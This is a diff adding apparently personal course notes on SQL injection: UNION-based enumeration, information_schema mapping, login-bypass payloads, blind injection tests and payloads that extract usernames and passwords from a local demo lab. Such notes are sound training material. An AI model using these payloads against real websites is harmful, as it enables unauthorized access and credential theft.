@@ -141,7 +141,7 @@ Here is how your notes should look to distinguish between `Broad` pivoting (from
 ---
 
 # Web Exploitation Day 1:
-### Fundamentals Study Guide
+## Fundamentals Study Guide
 
 ## 1.0 Web Fundamentals
 *   **Server/Client Relationship**: Client (Browser) requests; Server provides resources.
@@ -239,3 +239,209 @@ mysql
 USE messages;
 SELECT * FROM comments;
 DELETE FROM comments WHERE id = <ID>;
+```
+
+---
+
+# Web Exploitation Day21:
+## 🗄️ SQL Injection: Advanced Enumeration & Union Attacks
+
+## 1.0 Detection & Methods
+Before injecting, identify how the server handles data.
+*   **POST (Forms)**: Test using `'` or `OR 1=1`. 
+*   **GET (URL)**: Test directly in the URL (e.g., `?id=2 OR 1=1`). 
+    *   *Note*: Integers in URLs often **don't** require a single quote (`Selection=2 OR 1=1`), whereas strings in forms **do** (`tom' OR 1='1`).
+
+### The Goal of the Single Quote (`'`)
+We use `'` to **break out** of the developer's intended string so we can append our own SQL commands.
+
+---
+
+## 2.0 Union Select: The Step-by-Step
+Used to append results from a different table to the original query's output.
+
+### Step 1: Find the Column Count
+Increment numbers until the page loads correctly (no error).
+*   `Selection=2 UNION SELECT 1--` (Error? Try next)
+*   `Selection=2 UNION SELECT 1,2--` (Error? Try next)
+*   `Selection=2 UNION SELECT 1,2,3--` (**Success!** We now know there are 3 columns).
+
+### Step 2: Identify Displayed Columns
+Look at the page to see where "1", "2", or "3" appears. This tells you which column is safe to pull text data into.
+
+### Step 3: The "Golden Statement" (Database Mapping)
+Use the `information_schema` (a built-in DB that tracks all other DBs) to find targets.
+
+
+| Goal | Payload (Assuming 3 Columns) |
+| :--- | :--- |
+| **List Tables** | `UNION SELECT 1, table_name, 3 FROM information_schema.tables--` |
+| **List Databases** | `UNION SELECT 1, table_schema, 3 FROM information_schema.tables--` |
+| **List Columns** | `UNION SELECT 1, column_name, 3 FROM information_schema.columns--` |
+| **The "Golden"** | `UNION SELECT table_schema, table_name, column_name FROM information_schema.columns--` |
+
+---
+
+## 3.0 Advanced Techniques
+
+### 3.1 Commenting (Terminators)
+Used to ignore the rest of the legitimate server-side query.
+*   `#` : Hash (Common in MySQL).
+*   `-- ` : Double-dash + Space (Standard SQL).
+*   `/*` : C-style comment.
+
+### 3.2 Nesting & Parenthesis
+If the query is wrapped in parentheses like `WHERE id = ('$id')`, your inject must "close" them first:
+*   **Payload**: `1') OR 1=1 #`
+*   **Becomes**: `WHERE id = ('1') OR 1=1 #')`
+
+### 3.3 System Information
+*   `@@version` : Get DB version.
+*   `database()` : Get current DB name.
+*   `user()` : Get current DB user.
+*   *Example*: `UNION SELECT 1, @@version, database()--`
+
+---
+
+## 4.0 Blind SQL Injection
+Used when the page **doesn't display data** but changes its behavior (e.g., "Welcome" vs. "Error").
+*   **Truth Test**: `?id=1 AND 1=1` (Page looks normal).
+*   **False Test**: `?id=1 AND 1=2` (Page content disappears or changes).
+*   *Logic*: If the page changes, the field is injectable, even if you can't "see" the data.
+
+---
+
+## 💡 Quick Tips for the Demo Box
+1.  **Selection Injection**: If `Selection=2 OR 1=1` works, try `Selection=2 UNION SELECT 1,2,3`.
+2.  **Order Matters**: If the server expects an Integer in column 1 but you put a String (`name`), it might error. Swap your `SELECT` positions until it works.
+3.  **Cross-DB Querying**: If you find a table in another database: 
+    `UNION SELECT 1, name, 3 FROM other_db.target_table--`
+
+# 🗄️ SQL Injection Quick-Reference Cheat Sheet
+
+### 1. Authentication Bypass (Login Forms)
+The goal is to make the `WHERE` clause always true or comment out the password check. 
+
+
+| Strategy | Common Payload | Becomes (Resulting Query) |
+| :--- | :--- | :--- |
+| **Basic Truth** | `' OR 1=1--` | `WHERE user = '' OR 1=1--' AND pass = '...'` |
+| **Admin Direct** | `admin'--` | `WHERE user = 'admin'--' AND pass = '...'` |
+| **Parenthesis** | `admin')--` | `WHERE user = ('admin')--') AND pass = '...'` |
+| **No Quotes** | `1 OR 1=1` | `WHERE id = 1 OR 1=1` (Used for numeric IDs) |
+
+---
+
+### 2. Union-Based Enumeration (The "Step-by-Step")
+Use these in a vulnerable GET or POST parameter to map the database structure.
+
+
+| Step | Goal | Payload Example |
+| :--- | :--- | :--- |
+| **1** | Find Columns | `' ORDER BY 1--`, `' ORDER BY 2--` (Repeat until error) |
+| **2** | Test Union | `' UNION SELECT 1,2,3--` (Identify which numbers show on screen) |
+| **3** | DB Name | `' UNION SELECT 1, database(), 3--` |
+| **4** | DB User | `' UNION SELECT 1, user(), 3--` |
+| **5** | DB Version | `' UNION SELECT 1, @@version, 3--` |
+
+---
+
+### 3. The "Golden Statements" (Mapping the Schema)
+Once you have the correct column count, use `information_schema` to find exactly what to steal.
+
+**List All Tables:**
+```sql
+' UNION SELECT 1, table_name, 3 FROM information_schema.tables WHERE table_schema=database()--
+```
+
+**List Columns in a Specific Table:**
+```sql
+' UNION SELECT 1, column_name, 3 FROM information_schema.columns WHERE table_name='your_table_name'--
+```
+
+# 🗄️ SQL Injection: GET & POST Methodology
+
+## 🛠️ General Rules
+- **Column Matching:** The `UNION` operator requires the exact same number of columns as the original query.
+- **Data Types:** The data types in your `SELECT` must match the original query's columns.
+- **Nulling the Original:** Often, you must make the first part of the query return nothing (e.g., `id=-1`) to force your `UNION` results to display on the screen.
+- **Comments:** Use `#` (MySQL) or `-- ` (Universal) to truncate the rest of the original developer's query.
+
+---
+
+## 📮 POST Method
+*Data is sent in the request body (e.g., login forms, search bars).*
+
+### 1. Test for Vulnerability
+Inject a single quote or logic to see if the database response changes.
+```sql
+Audi 'OR 1 ='1
+-- or
+Audi' OR 1=1 #
+```
+
+### 2. Determine Column Count (The "Order By" or "Union" Test) (MOST Important)
+Increment the number until the page returns an error to find the count.
+- Note: If '2' appears on the webpage, that is your "injection point" where data will be visible.
+```sql
+-- Column 2 is our hidden value
+Audi' UNION SELECT 1,2,3,4,5 #
+```
+
+### 3. Map the Schema (The Golden Statement)
+Query the `information_schema` to find where the sensitive data lives.
+```sql
+Audi' UNION SELECT 1,2,table_schema,table_name,column_name FROM information_schema.columns #
+```
+**Structure:** `[Placeholders]`, `[Metadata Columns]` FROM `[Internal DB]`.`[Internal Table]`
+
+### 4. Extract Data
+The final payoff using the names discovered in Step 3.
+```sql
+Audi' UNION SELECT studentID,2,username,passwd,jump FROM session.userinfo #
+```
+
+## 🌐 GET Method
+Data is sent directly in the URL. Special characters must be URL Encoded.
+
+Character	URL Code
+- `Space`	+ or %20
+- `'` (Quote)	%27
+- `#` (Hash)	%23
+
+### Step 1: Test for Vulnerability
+Check if the application is processing logic by making the statement always true.
+- **Payload:** `?Selection=2 OR 1=1`
+- **Full URL:** `http://127.0.0.1:1237/uniondemo.php?Selection=2 or 1=1`
+
+### Step 2: Identify Injection Points
+Use `UNION SELECT` to see which column numbers actually display on the webpage.
+- **Payload:** `?Selection=-1 UNION SELECT 1,2,3 #`
+
+### Step 2a: Determine Column Count
+Use `ORDER BY` to find the number of columns. Keep increasing the number until the page returns an error.
+- **Payload:** `?Selection=2 ORDER BY 3 #`
+
+### Step 3: Schema Mapping (The "Golden Statement")
+Query the database's internal blueprint to find table and column names.
+- **Payload:** `?Selection=2 Union SELECT table_schema,column_name,table_name FROM information_schema.columns #`
+
+### Step 4: Data Extraction
+The final step is to pull the sensitive data from the table and columns you discovered in Step 4.
+- **Payload:** `?Selection=-1 UNION SELECT studentID,username,passwd FROM session.userinfo #`
+
+### ⚡ Bonus: SQL Version Check
+Quickly identify the database version and current database name.
+- **Payload:** `?Selection=-1 UNION SELECT @@version,database(),user() #`
+- **Full URL:** `http://127.0.0`
+
+##  ⚡ SQL Version & DB Info
+Quickly identify the backend environment.
+```sql
+-- POST:
+Audi' UNION SELECT @@version, database(), user(), 4, 5 #
+```
+```sql
+-- GET:
+?Selection=-1 UNION SELECT @@version,database(),user() #
+```
